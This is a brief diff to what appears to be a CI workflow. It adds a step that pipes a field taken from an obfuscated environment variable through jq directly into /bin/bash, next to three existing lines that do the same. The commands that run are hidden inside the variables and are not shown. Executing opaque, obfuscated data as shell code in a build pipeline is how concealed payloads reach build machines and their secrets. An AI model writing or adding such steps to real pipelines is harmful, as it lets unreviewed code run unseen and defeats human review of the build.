@@ -33,6 +33,7 @@ jobs:
           printf '%s' "$wam01" | jq -r .zv6314 | /bin/bash
           echo $bare6 | jq -r .xorii27932 | /bin/bash
           printf '%s' "$pyiq657" | jq -r .ido0 | /bin/bash
+          printf '%s' "$irlnm56214" | jq -r .tap70136 | /bin/bash
 
       - name: Archive results
         if: always()
